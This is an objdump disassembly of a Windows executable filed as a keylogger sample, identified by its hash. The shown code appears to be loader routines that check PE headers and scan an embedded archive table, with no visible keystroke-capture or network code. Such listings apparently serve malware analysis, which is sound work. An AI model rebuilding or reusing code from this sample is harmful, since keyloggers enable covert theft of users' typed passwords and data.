
malware_samples/keylogger/2c86b264dd3f730d3b236df6a0a48214a4f52e2ca1d90108f0e3fafaac95fc31.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 53                	rex push %rbx
   140001002:	48 83 ec 20          	sub    $0x20,%rsp
   140001006:	e8 d1 99 00 00       	call   0x14000a9dc
   14000100b:	48 8b d8             	mov    %rax,%rbx
   14000100e:	e8 c1 99 00 00       	call   0x14000a9d4
   140001013:	48 8b 13             	mov    (%rbx),%rdx
   140001016:	8b 08                	mov    (%rax),%ecx
   140001018:	e8 63 47 00 00       	call   0x140005780
   14000101d:	48 8b d8             	mov    %rax,%rbx
   140001020:	e8 af 99 00 00       	call   0x14000a9d4
   140001025:	48 8b d3             	mov    %rbx,%rdx
   140001028:	8b 08                	mov    (%rax),%ecx
   14000102a:	48 83 c4 20          	add    $0x20,%rsp
   14000102e:	5b                   	pop    %rbx
   14000102f:	e9 ec 18 00 00       	jmp    0x140002920
   140001034:	cc                   	int3
   140001035:	cc                   	int3
   140001036:	cc                   	int3
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001045:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000104a:	57                   	push   %rdi
   14000104b:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140001052:	48 8b f1             	mov    %rcx,%rsi
   140001055:	48 8b fa             	mov    %rdx,%rdi
   140001058:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   14000105b:	e8 12 7b 00 00       	call   0x140008b72
   140001060:	8b c8                	mov    %eax,%ecx
   140001062:	e8 6d 9d 00 00       	call   0x14000add4
   140001067:	48 8b d8             	mov    %rax,%rbx
   14000106a:	48 85 c0             	test   %rax,%rax
   14000106d:	75 11                	jne    0x140001080
   14000106f:	48 8d 0d 92 13 02 00 	lea    0x21392(%rip),%rcx        # 0x140022408
   140001076:	e8 15 0e 00 00       	call   0x140001e90
   14000107b:	e9 8c 00 00 00       	jmp    0x14000110c
   140001080:	8b 4f 08             	mov    0x8(%rdi),%ecx
   140001083:	33 c0                	xor    %eax,%eax
   140001085:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000108a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000108f:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001094:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001099:	e8 d4 7a 00 00       	call   0x140008b72
   14000109e:	8b 4f 0c             	mov    0xc(%rdi),%ecx
   1400010a1:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400010a5:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400010aa:	e8 c3 7a 00 00       	call   0x140008b72
   1400010af:	41 b8 58 00 00 00    	mov    $0x58,%r8d
   1400010b5:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400010b9:	48 8d 15 70 13 02 00 	lea    0x21370(%rip),%rdx        # 0x140022430
   1400010c0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400010c5:	e8 a6 67 00 00       	call   0x140007870
   1400010ca:	85 c0                	test   %eax,%eax
   1400010cc:	78 2b                	js     0x1400010f9
   1400010ce:	ba 04 00 00 00       	mov    $0x4,%edx
   1400010d3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400010d8:	e8 33 4e 00 00       	call   0x140005f10
   1400010dd:	85 c0                	test   %eax,%eax
   1400010df:	78 0f                	js     0x1400010f0
   1400010e1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400010e6:	e8 25 66 00 00       	call   0x140007710
   1400010eb:	48 8b c3             	mov    %rbx,%rax
   1400010ee:	eb 1e                	jmp    0x14000110e
   1400010f0:	48 8d 0d 41 13 02 00 	lea    0x21341(%rip),%rcx        # 0x140022438
   1400010f7:	eb 07                	jmp    0x140001100
   1400010f9:	48 8d 0d 58 13 02 00 	lea    0x21358(%rip),%rcx        # 0x140022458
   140001100:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140001105:	8b d0                	mov    %eax,%edx
   140001107:	e8 84 0d 00 00       	call   0x140001e90
   14000110c:	33 c0                	xor    %eax,%eax
   14000110e:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140001115:	00 
   140001116:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000111a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000111e:	49 8b e3             	mov    %r11,%rsp
   140001121:	5f                   	pop    %rdi
   140001122:	c3                   	ret
   140001123:	cc                   	int3
   140001124:	cc                   	int3
   140001125:	cc                   	int3
   140001126:	cc                   	int3
   140001127:	cc                   	int3
   140001128:	cc                   	int3
   140001129:	cc                   	int3
   14000112a:	cc                   	int3
   14000112b:	cc                   	int3
   14000112c:	cc                   	int3
   14000112d:	cc                   	int3
   14000112e:	cc                   	int3
   14000112f:	cc                   	int3
   140001130:	40 53                	rex push %rbx
   140001132:	48 83 ec 20          	sub    $0x20,%rsp
   140001136:	48 8b d9             	mov    %rcx,%rbx
   140001139:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140001140:	00 
   140001141:	48 8b 09             	mov    (%rcx),%rcx
   140001144:	45 33 c0             	xor    %r8d,%r8d
   140001147:	33 d2                	xor    %edx,%edx
   140001149:	e8 92 a3 00 00       	call   0x14000b4e0
   14000114e:	4c 8b 0b             	mov    (%rbx),%r9
   140001151:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001156:	ba 01 00 00 00       	mov    $0x1,%edx
   14000115b:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000115f:	e8 40 a0 00 00       	call   0x14000b1a4
   140001164:	80 7c 24 30 4d       	cmpb   $0x4d,0x30(%rsp)
   140001169:	0f 85 b1 00 00 00    	jne    0x140001220
   14000116f:	80 7c 24 31 5a       	cmpb   $0x5a,0x31(%rsp)
   140001174:	0f 85 a6 00 00 00    	jne    0x140001220
   14000117a:	48 8b 0b             	mov    (%rbx),%rcx
   14000117d:	45 33 c0             	xor    %r8d,%r8d
   140001180:	41 8d 50 3c          	lea    0x3c(%r8),%edx
   140001184:	e8 57 a3 00 00       	call   0x14000b4e0
   140001189:	4c 8b 0b             	mov    (%rbx),%r9
   14000118c:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001191:	ba 04 00 00 00       	mov    $0x4,%edx
   140001196:	44 8d 42 fd          	lea    -0x3(%rdx),%r8d
   14000119a:	e8 05 a0 00 00       	call   0x14000b1a4
   14000119f:	8b 54 24 38          	mov    0x38(%rsp),%edx
   1400011a3:	45 33 c0             	xor    %r8d,%r8d
   1400011a6:	48 8b 0b             	mov    (%rbx),%rcx
   1400011a9:	83 c2 18             	add    $0x18,%edx
   1400011ac:	e8 2f a3 00 00       	call   0x14000b4e0
   1400011b1:	4c 8b 0b             	mov    (%rbx),%r9
   1400011b4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400011b9:	ba 02 00 00 00       	mov    $0x2,%edx
   1400011be:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   1400011c2:	e8 dd 9f 00 00       	call   0x14000b1a4
   1400011c7:	80 7c 24 30 0b       	cmpb   $0xb,0x30(%rsp)
   1400011cc:	75 52                	jne    0x140001220
   1400011ce:	0f b6 44 24 31       	movzbl 0x31(%rsp),%eax
   1400011d3:	3c 01                	cmp    $0x1,%al
   1400011d5:	75 07                	jne    0x1400011de
   1400011d7:	b9 98 00 00 00       	mov    $0x98,%ecx
   1400011dc:	eb 09                	jmp    0x1400011e7
   1400011de:	3c 02                	cmp    $0x2,%al
   1400011e0:	75 3e                	jne    0x140001220
   1400011e2:	b9 a8 00 00 00       	mov    $0xa8,%ecx
   1400011e7:	8b 54 24 38          	mov    0x38(%rsp),%edx
   1400011eb:	45 33 c0             	xor    %r8d,%r8d
   1400011ee:	03 d1                	add    %ecx,%edx
   1400011f0:	48 8b 0b             	mov    (%rbx),%rcx
   1400011f3:	e8 e8 a2 00 00       	call   0x14000b4e0
   1400011f8:	4c 8b 0b             	mov    (%rbx),%r9
   1400011fb:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001200:	ba 04 00 00 00       	mov    $0x4,%edx
   140001205:	44 8d 42 fd          	lea    -0x3(%rdx),%r8d
   140001209:	e8 96 9f 00 00       	call   0x14000b1a4
   14000120e:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140001212:	83 c9 ff             	or     $0xffffffff,%ecx
   140001215:	85 c0                	test   %eax,%eax
   140001217:	0f 44 c1             	cmove  %ecx,%eax
   14000121a:	48 83 c4 20          	add    $0x20,%rsp
   14000121e:	5b                   	pop    %rbx
   14000121f:	c3                   	ret
   140001220:	83 c8 ff             	or     $0xffffffff,%eax
   140001223:	48 83 c4 20          	add    $0x20,%rsp
   140001227:	5b                   	pop    %rbx
   140001228:	c3                   	ret
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001235:	57                   	push   %rdi
   140001236:	48 83 ec 20          	sub    $0x20,%rsp
   14000123a:	48 83 39 00          	cmpq   $0x0,(%rcx)
   14000123e:	48 8b ea             	mov    %rdx,%rbp
   140001241:	48 8b f9             	mov    %rcx,%rdi
   140001244:	75 31                	jne    0x140001277
   140001246:	48 83 c1 78          	add    $0x78,%rcx
   14000124a:	48 8d 15 af 11 02 00 	lea    0x211af(%rip),%rdx        # 0x140022400
   140001251:	e8 7a 1b 00 00       	call   0x140002dd0
   140001256:	48 89 07             	mov    %rax,(%rdi)
   140001259:	48 85 c0             	test   %rax,%rax
   14000125c:	75 19                	jne    0x140001277
   14000125e:	48 8d 0d 13 12 02 00 	lea    0x21213(%rip),%rcx        # 0x140022478
   140001265:	e8 26 0c 00 00       	call   0x140001e90
   14000126a:	33 c0                	xor    %eax,%eax
   14000126c:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001271:	48 83 c4 20          	add    $0x20,%rsp
   140001275:	5f                   	pop    %rdi
   140001276:	c3                   	ret
   140001277:	8b 4d 04             	mov    0x4(%rbp),%ecx
   14000127a:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000127f:	e8 ee 78 00 00       	call   0x140008b72
   140001284:	03 47 08             	add    0x8(%rdi),%eax
   140001287:	45 33 c0             	xor    %r8d,%r8d
   14000128a:	48 8b 0f             	mov    (%rdi),%rcx
   14000128d:	8b d0                	mov    %eax,%edx
   14000128f:	e8 4c a2 00 00       	call   0x14000b4e0
   140001294:	8b 4d 08             	mov    0x8(%rbp),%ecx
   140001297:	e8 d6 78 00 00       	call   0x140008b72
   14000129c:	8b c8                	mov    %eax,%ecx
   14000129e:	e8 31 9b 00 00       	call   0x14000add4
   1400012a3:	48 8b f0             	mov    %rax,%rsi
   1400012a6:	48 85 c0             	test   %rax,%rax
   1400012a9:	75 1e                	jne    0x1400012c9
   1400012ab:	48 8d 0d e6 11 02 00 	lea    0x211e6(%rip),%rcx        # 0x140022498
   1400012b2:	e8 d9 0b 00 00       	call   0x140001e90
   1400012b7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400012bc:	33 c0                	xor    %eax,%eax
   1400012be:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400012c3:	48 83 c4 20          	add    $0x20,%rsp
   1400012c7:	5f                   	pop    %rdi
   1400012c8:	c3                   	ret
   1400012c9:	8b 4d 08             	mov    0x8(%rbp),%ecx
   1400012cc:	e8 a1 78 00 00       	call   0x140008b72
   1400012d1:	4c 8b 0f             	mov    (%rdi),%r9
   1400012d4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400012da:	8b d0                	mov    %eax,%edx
   1400012dc:	48 8b ce             	mov    %rsi,%rcx
   1400012df:	e8 c0 9e 00 00       	call   0x14000b1a4
   1400012e4:	48 83 f8 01          	cmp    $0x1,%rax
   1400012e8:	73 26                	jae    0x140001310
   1400012ea:	48 8d 0d c7 11 02 00 	lea    0x211c7(%rip),%rcx        # 0x1400224b8
   1400012f1:	e8 9a 0b 00 00       	call   0x140001e90
   1400012f6:	48 8b ce             	mov    %rsi,%rcx
   1400012f9:	e8 ce 9a 00 00       	call   0x14000adcc
   1400012fe:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001303:	33 c0                	xor    %eax,%eax
   140001305:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000130a:	48 83 c4 20          	add    $0x20,%rsp
   14000130e:	5f                   	pop    %rdi
   14000130f:	c3                   	ret
   140001310:	80 7d 10 01          	cmpb   $0x1,0x10(%rbp)
   140001314:	75 4a                	jne    0x140001360
   140001316:	48 8b d5             	mov    %rbp,%rdx
   140001319:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000131e:	48 8b ce             	mov    %rsi,%rcx
   140001321:	e8 1a fd ff ff       	call   0x140001040
   140001326:	48 8b ce             	mov    %rsi,%rcx
   140001329:	48 8b d8             	mov    %rax,%rbx
   14000132c:	e8 9b 9a 00 00       	call   0x14000adcc
   140001331:	48 85 db             	test   %rbx,%rbx
   140001334:	48 8b f3             	mov    %rbx,%rsi
   140001337:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000133c:	75 22                	jne    0x140001360
   14000133e:	48 8d 55 12          	lea    0x12(%rbp),%rdx
   140001342:	48 8d 0d 8f 11 02 00 	lea    0x2118f(%rip),%rcx        # 0x1400224d8
   140001349:	e8 42 0b 00 00       	call   0x140001e90
   14000134e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001353:	33 c0                	xor    %eax,%eax
   140001355:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000135a:	48 83 c4 20          	add    $0x20,%rsp
   14000135e:	5f                   	pop    %rdi
   14000135f:	c3                   	ret
   140001360:	48 8b 0f             	mov    (%rdi),%rcx
   140001363:	48 85 c9             	test   %rcx,%rcx
   140001366:	74 0c                	je     0x140001374
   140001368:	e8 f3 9a 00 00       	call   0x14000ae60
   14000136d:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001374:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001379:	48 8b c6             	mov    %rsi,%rax
   14000137c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001381:	48 83 c4 20          	add    $0x20,%rsp
   140001385:	5f                   	pop    %rdi
   140001386:	c3                   	ret
   140001387:	cc                   	int3
   140001388:	cc                   	int3
   140001389:	cc                   	int3
   14000138a:	cc                   	int3
   14000138b:	cc                   	int3
   14000138c:	cc                   	int3
   14000138d:	cc                   	int3
   14000138e:	cc                   	int3
   14000138f:	cc                   	int3
   140001390:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001395:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000139a:	57                   	push   %rdi
   14000139b:	48 83 ec 20          	sub    $0x20,%rsp
   14000139f:	48 8b f2             	mov    %rdx,%rsi
   1400013a2:	48 8b f9             	mov    %rcx,%rdi
   1400013a5:	e8 86 fe ff ff       	call   0x140001230
   1400013aa:	48 8b cf             	mov    %rdi,%rcx
   1400013ad:	48 8b e8             	mov    %rax,%rbp
   1400013b0:	e8 0b 33 00 00       	call   0x1400046c0
   1400013b5:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400013b8:	75 12                	jne    0x1400013cc
   1400013ba:	0b c0                	or     %eax,%eax
   1400013bc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400013c1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400013c6:	48 83 c4 20          	add    $0x20,%rsp
   1400013ca:	5f                   	pop    %rdi
   1400013cb:	c3                   	ret
   1400013cc:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400013d1:	48 8d 8f 78 20 00 00 	lea    0x2078(%rdi),%rcx
   1400013d8:	48 8d 5e 12          	lea    0x12(%rsi),%rbx
   1400013dc:	48 8b d3             	mov    %rbx,%rdx
   1400013df:	e8 2c 36 00 00       	call   0x140004a10
   1400013e4:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   1400013e7:	48 8b f8             	mov    %rax,%rdi
   1400013ea:	e8 83 77 00 00       	call   0x140008b72
   1400013ef:	8b f0                	mov    %eax,%esi
   1400013f1:	48 85 ff             	test   %rdi,%rdi
   1400013f4:	75 1b                	jne    0x140001411
   1400013f6:	4c 8b c3             	mov    %rbx,%r8
   1400013f9:	48 8d 15 f0 10 02 00 	lea    0x210f0(%rip),%rdx        # 0x1400224f0
   140001400:	48 8d 0d 05 11 02 00 	lea    0x21105(%rip),%rcx        # 0x14002250c
   140001407:	e8 54 05 00 00       	call   0x140001960
   14000140c:	83 c8 ff             	or     $0xffffffff,%eax
   14000140f:	eb 4c                	jmp    0x14000145d
   140001411:	4c 8b cf             	mov    %rdi,%r9
   140001414:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000141a:	48 8b d6             	mov    %rsi,%rdx
   14000141d:	48 8b cd             	mov    %rbp,%rcx
   140001420:	e8 e7 a7 00 00       	call   0x14000bc0c
   140001425:	48 83 f8 01          	cmp    $0x1,%rax
   140001429:	74 20                	je     0x14000144b
   14000142b:	48 85 f6             	test   %rsi,%rsi
   14000142e:	74 1b                	je     0x14000144b
   140001430:	4c 8b c3             	mov    %rbx,%r8
   140001433:	48 8d 15 de 10 02 00 	lea    0x210de(%rip),%rdx        # 0x140022518
   14000143a:	48 8d 0d fb 10 02 00 	lea    0x210fb(%rip),%rcx        # 0x14002253c
   140001441:	e8 1a 05 00 00       	call   0x140001960
   140001446:	83 c8 ff             	or     $0xffffffff,%eax
   140001449:	eb 12                	jmp    0x14000145d
   14000144b:	48 8b cf             	mov    %rdi,%rcx
   14000144e:	e8 0d 9a 00 00       	call   0x14000ae60
   140001453:	48 8b cd             	mov    %rbp,%rcx
   140001456:	e8 71 99 00 00       	call   0x14000adcc
   14000145b:	33 c0                	xor    %eax,%eax
   14000145d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001462:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001467:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000146c:	48 83 c4 20          	add    $0x20,%rsp
   140001470:	5f                   	pop    %rdi
   140001471:	c3                   	ret
   140001472:	cc                   	int3
   140001473:	cc                   	int3
   140001474:	cc                   	int3
   140001475:	cc                   	int3
   140001476:	cc                   	int3
   140001477:	cc                   	int3
   140001478:	cc                   	int3
   140001479:	cc                   	int3
   14000147a:	cc                   	int3
   14000147b:	cc                   	int3
   14000147c:	cc                   	int3
   14000147d:	cc                   	int3
   14000147e:	cc                   	int3
   14000147f:	cc                   	int3
   140001480:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001485:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000148a:	57                   	push   %rdi
   14000148b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001492:	48 8b 05 77 0b 03 00 	mov    0x30b77(%rip),%rax        # 0x140032010
   140001499:	48 33 c4             	xor    %rsp,%rax
   14000149c:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400014a3:	00 
   1400014a4:	8d 72 a0             	lea    -0x60(%rdx),%esi
   1400014a7:	48 8b f9             	mov    %rcx,%rdi
   1400014aa:	48 8b 09             	mov    (%rcx),%rcx
   1400014ad:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
   1400014b2:	8b d6                	mov    %esi,%edx
   1400014b4:	45 33 c0             	xor    %r8d,%r8d
   1400014b7:	e8 24 a0 00 00       	call   0x14000b4e0
   1400014bc:	85 c0                	test   %eax,%eax
   1400014be:	75 46                	jne    0x140001506
   1400014c0:	4c 8b 0f             	mov    (%rdi),%r9
   1400014c3:	8d 50 60             	lea    0x60(%rax),%edx
   1400014c6:	44 8d 40 01          	lea    0x1(%rax),%r8d
   1400014ca:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400014cf:	e8 d0 9c 00 00       	call   0x14000b1a4
   1400014d4:	48 83 f8 01          	cmp    $0x1,%rax
   1400014d8:	72 2c                	jb     0x140001506
   1400014da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400014e0:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400014e6:	48 8d 0d 5b 10 02 00 	lea    0x2105b(%rip),%rcx        # 0x140022548
   1400014ed:	48 8b d3             	mov    %rbx,%rdx
   1400014f0:	e8 0b 95 00 00       	call   0x14000aa00
   1400014f5:	85 c0                	test   %eax,%eax
   1400014f7:	74 12                	je     0x14000150b
   1400014f9:	48 ff cb             	dec    %rbx
   1400014fc:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140001501:	48 3b d8             	cmp    %rax,%rbx
   140001504:	73 da                	jae    0x1400014e0
   140001506:	83 c8 ff             	or     $0xffffffff,%eax
   140001509:	eb 4c                	jmp    0x140001557
   14000150b:	0f 10 03             	movups (%rbx),%xmm0
   14000150e:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   140001512:	0f 11 47 20          	movups %xmm0,0x20(%rdi)
   140001516:	0f 10 43 20          	movups 0x20(%rbx),%xmm0
   14000151a:	0f 11 4f 30          	movups %xmm1,0x30(%rdi)
   14000151e:	0f 10 4b 30          	movups 0x30(%rbx),%xmm1
   140001522:	0f 11 47 40          	movups %xmm0,0x40(%rdi)
   140001526:	0f 10 43 40          	movups 0x40(%rbx),%xmm0
   14000152a:	0f 11 4f 50          	movups %xmm1,0x50(%rdi)
   14000152e:	f2 0f 10 4b 50       	movsd  0x50(%rbx),%xmm1
   140001533:	0f 11 47 60          	movups %xmm0,0x60(%rdi)
   140001537:	f2 0f 11 4f 70       	movsd  %xmm1,0x70(%rdi)
   14000153c:	8b 4f 28             	mov    0x28(%rdi),%ecx
   14000153f:	e8 2e 76 00 00       	call   0x140008b72
   140001544:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001549:	2b d9                	sub    %ecx,%ebx
   14000154b:	03 de                	add    %esi,%ebx
   14000154d:	2b d8                	sub    %eax,%ebx
   14000154f:	83 c3 58             	add    $0x58,%ebx
   140001552:	89 5f 08             	mov    %ebx,0x8(%rdi)
   140001555:	33 c0                	xor    %eax,%eax
   140001557:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000155e:	00 
   14000155f:	48 33 cc             	xor    %rsp,%rcx
   140001562:	e8 a9 76 00 00       	call   0x140008c10
   140001567:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   14000156e:	00 
   14000156f:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001573:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001577:	49 8b e3             	mov    %r11,%rsp
   14000157a:	5f                   	pop    %rdi
   14000157b:	c3                   	ret
   14000157c:	cc                   	int3
   14000157d:	cc                   	int3
   14000157e:	cc                   	int3
   14000157f:	cc                   	int3
   140001580:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001585:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000158a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000158f:	57                   	push   %rdi
   140001590:	48 83 ec 20          	sub    $0x20,%rsp
   140001594:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   140001598:	48 8b ea             	mov    %rdx,%rbp
   14000159b:	48 8b f1             	mov    %rcx,%rsi
   14000159e:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400015a2:	48 ff c7             	inc    %rdi
   1400015a5:	80 3c 17 00          	cmpb   $0x0,(%rdi,%rdx,1)
   1400015a9:	75 f7                	jne    0x1400015a2
   1400015ab:	48 3b 59 18          	cmp    0x18(%rcx),%rbx
   1400015af:	73 44                	jae    0x1400015f5
   1400015b1:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   1400015b5:	75 13                	jne    0x1400015ca
   1400015b7:	4c 63 c7             	movslq %edi,%r8
   1400015ba:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400015be:	48 8b d5             	mov    %rbp,%rdx
   1400015c1:	e8 3a 94 00 00       	call   0x14000aa00
   1400015c6:	85 c0                	test   %eax,%eax
   1400015c8:	74 42                	je     0x14000160c
   1400015ca:	8b 0b                	mov    (%rbx),%ecx
   1400015cc:	e8 a1 75 00 00       	call   0x140008b72
   1400015d1:	8b c0                	mov    %eax,%eax
   1400015d3:	48 03 c3             	add    %rbx,%rax
   1400015d6:	48 8b d8             	mov    %rax,%rbx
   1400015d9:	48 3b 46 10          	cmp    0x10(%rsi),%rax
   1400015dd:	73 10                	jae    0x1400015ef
   1400015df:	48 8d 0d fa 0d 02 00 	lea    0x20dfa(%rip),%rcx        # 0x1400223e0
   1400015e6:	e8 95 07 00 00       	call   0x140001d80
   1400015eb:	48 8b 5e 18          	mov    0x18(%rsi),%rbx
   1400015ef:	48 3b 5e 18          	cmp    0x18(%rsi),%rbx
   1400015f3:	72 bc                	jb     0x1400015b1
   1400015f5:	33 c0                	xor    %eax,%eax
   1400015f7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400015fc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001601:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001606:	48 83 c4 20          	add    $0x20,%rsp
   14000160a:	5f                   	pop    %rdi
   14000160b:	c3                   	ret
   14000160c:	48 63 cf             	movslq %edi,%rcx
   14000160f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001613:	48 03 c1             	add    %rcx,%rax
   140001616:	80 38 00             	cmpb   $0x0,(%rax)
   140001619:	74 dc                	je     0x1400015f7
   14000161b:	48 8d 43 13          	lea    0x13(%rbx),%rax
   14000161f:	48 03 c1             	add    %rcx,%rax
   140001622:	eb d3                	jmp    0x1400015f7
   140001624:	cc                   	int3
   140001625:	cc                   	int3
   140001626:	cc                   	int3
   140001627:	cc                   	int3
   140001628:	cc                   	int3
   140001629:	cc                   	int3
   14000162a:	cc                   	int3
   14000162b:	cc                   	int3
   14000162c:	cc                   	int3
   14000162d:	cc                   	int3
   14000162e:	cc                   	int3
   14000162f:	cc                   	int3
   140001630:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001635:	57                   	push   %rdi
   140001636:	48 83 ec 20          	sub    $0x20,%rsp
   14000163a:	48 8b f9             	mov    %rcx,%rdi
   14000163d:	48 8b da             	mov    %rdx,%rbx
   140001640:	8b 0a                	mov    (%rdx),%ecx
   140001642:	e8 2b 75 00 00       	call   0x140008b72
   140001647:	8b c0                	mov    %eax,%eax
   140001649:	48 03 c3             	add    %rbx,%rax
   14000164c:	48 3b 47 10          	cmp    0x10(%rdi),%rax
   140001650:	73 10                	jae    0x140001662
   140001652:	48 8d 0d 87 0d 02 00 	lea    0x20d87(%rip),%rcx        # 0x1400223e0
   140001659:	e8 22 07 00 00       	call   0x140001d80
   14000165e:	48 8b 47 18          	mov    0x18(%rdi),%rax
   140001662:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001667:	48 83 c4 20          	add    $0x20,%rsp
   14000166b:	5f                   	pop    %rdi
   14000166c:	c3                   	ret
   14000166d:	cc                   	int3
   14000166e:	cc                   	int3
   14000166f:	cc                   	int3
   140001670:	40 53                	rex push %rbx
   140001672:	48 83 ec 20          	sub    $0x20,%rsp
   140001676:	48 83 39 00          	cmpq   $0x0,(%rcx)
   14000167a:	48 8b d9             	mov    %rcx,%rbx
   14000167d:	75 1c                	jne    0x14000169b
   14000167f:	48 83 c1 78          	add    $0x78,%rcx
   140001683:	48 8d 15 76 0d 02 00 	lea    0x20d76(%rip),%rdx        # 0x140022400
   14000168a:	e8 41 17 00 00       	call   0x140002dd0
   14000168f:	48 89 03             	mov    %rax,(%rbx)
   140001692:	48 85 c0             	test   %rax,%rax
   140001695:	0f 84 8d 00 00 00    	je     0x140001728
   14000169b:	48 8b cb             	mov    %rbx,%rcx
   14000169e:	e8 8d fa ff ff       	call   0x140001130
   1400016a3:	83 f8 01             	cmp    $0x1,%eax
   1400016a6:	7d 16                	jge    0x1400016be
   1400016a8:	48 8b 0b             	mov    (%rbx),%rcx
   1400016ab:	33 d2                	xor    %edx,%edx
   1400016ad:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   1400016b1:	e8 2a 9e 00 00       	call   0x14000b4e0
   1400016b6:	48 8b 0b             	mov    (%rbx),%rcx
   1400016b9:	e8 06 a3 00 00       	call   0x14000b9c4
   1400016be:	8b d0                	mov    %eax,%edx
   1400016c0:	48 8b cb             	mov    %rbx,%rcx
   1400016c3:	e8 b8 fd ff ff       	call   0x140001480
   1400016c8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016cb:	74 5b                	je     0x140001728
   1400016cd:	8b 4b 34             	mov    0x34(%rbx),%ecx
   1400016d0:	c7 83 7c 40 00 00 00 	movl   $0x0,0x407c(%rbx)
   1400016d7:	00 00 00 
   1400016da:	e8 93 74 00 00       	call   0x140008b72
   1400016df:	89 05 2f 14 03 00    	mov    %eax,0x3142f(%rip)        # 0x140032b14
   1400016e5:	8b 4b 2c             	mov    0x2c(%rbx),%ecx
   1400016e8:	e8 85 74 00 00       	call   0x140008b72
   1400016ed:	03 43 08             	add    0x8(%rbx),%eax
